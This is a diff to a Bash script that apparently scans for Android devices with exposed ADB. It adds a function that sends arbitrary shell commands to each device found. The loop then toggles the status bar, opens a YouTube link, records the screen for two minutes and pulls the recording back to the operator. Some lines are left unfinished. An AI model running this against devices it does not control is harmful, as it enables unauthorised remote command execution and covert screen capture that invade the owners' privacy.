@@ -14,7 +14,7 @@
 # [ ]	Start with basic system information output
 #
 #
-#
+#	https://www.shell-tips.com/bash/arrays/
 #
 
 ### Notes:
@@ -130,6 +130,39 @@ function osint_explore_adb_target {
 	echo -e "================================================================================"
 }
 
+# Function for sending an ADB shell command to a remote target
+function send_remote_adb_shell_command {
+	# Placing the function input into a local variable array for easier work 
+	local var function_input=($@)
+	#local var adb_target_id=$0
+	# Note: The adb_target_id is going to be item ZERO of the function_input array
+	local var adb_target_id=${function_input[0]}
+	#local var abd_command=$:2
+	# Note: The rest of the function_input (minus the ZEROTH ELEMENT) are the commands to be run
+	local var adb_command=${function_input[@]:1}
+	#echo -e "Input to Function:\t$@"
+	#echo -e "Input to Function (with arrays):\t${function_input[*]}"
+	# Testing for loop
+	#for value in "$@"; do echo -e "\tItem:\t$value"; done
+	#echo -e "\tPrint Rest of array ${'$@':2}"
+	#echo -e "\tPrint Rest of Array ${function_input[@]}"
+	# Debugging line for this function
+	#echo -e "\tADB Target:\t[\t$adb_target_id\t]\n\tADB Command:\t[\t$adb_command\t]"
+	# Send the command
+	adb -s $adb_target_id shell $adb_command
+}
+
+
+# Function for testing shell interaction with the target android id
+function test_shell_interaction {
+	local var adb_target_id=$1
+	echo -e "================================================================================"
+	echo -e "[*] Testing Interaction with the ADB Android Target ID\t-\t[\t$adb_target_id\t]"
+	echo -e "--------------------------------------------------------------------------------"
+	echo -e "[*] Attempt to move the status bar up and down"
+	adb -s $adb_target_id 
+}
+
 ### Main Script
 
 ## Check to see if any function variables were passed with the script
@@ -192,7 +225,30 @@ echo -e "Loop of Target Gathering:"
 for adb_target in $potential_adb_targets; do
 	echo -e "Potential Target:\t$adb_target"
 	adb_target_id=$(echo $adb_target | cut -d' ' -f1)
-	osint_explore_adb_target $adb_target_id
+	# Full OSINT of the ADB Target ID
+	#osint_explore_adb_target $adb_target_id
+	# Testing Return of Network Information
+	#send_remote_adb_shell_command $adb_target_id ip addr show
+	# Testing opening and closing the Android Status Bar
+	send_remote_adb_shell_command $adb_target_id service call statusbar 1
+	sleep 0.5
+	send_remote_adb_shell_command $adb_target_id service call statusbar 2
+	sleep 0.5
+	## Try to open a web browser
+	# Go back to home
+	send_remote_adb_shell_command $adb_target_id input keyevent 3
+	sleep 1
+	# Open a web browser
+	#send_remote_adb_shell_command $adb_target_id input keyevent 64
+	#sleep 2
+	# Highlight the Web URL Bar
+	#send_remote_adb_shell_command $adb_target_id input keyevent 
+	# Open Browser with Specific URL via Activity Manager
+	send_remote_adb_shell_command $adb_target_id am start -a android.intent.action.VIEW -d https://www.youtube.com/watch?v=dQw4w9WgXcQ
+	# Screen capture (time is in seconds?)
+	send_remote_adb_shell_command $adb_target_id screenrecord --time-limit 120 /sdcard/screenrecord-003.mp4
+	sleep 120
+	adb -s $adb_target_id pull /sdcard/screenrecord-003.mp4 ./.
 done
 
 
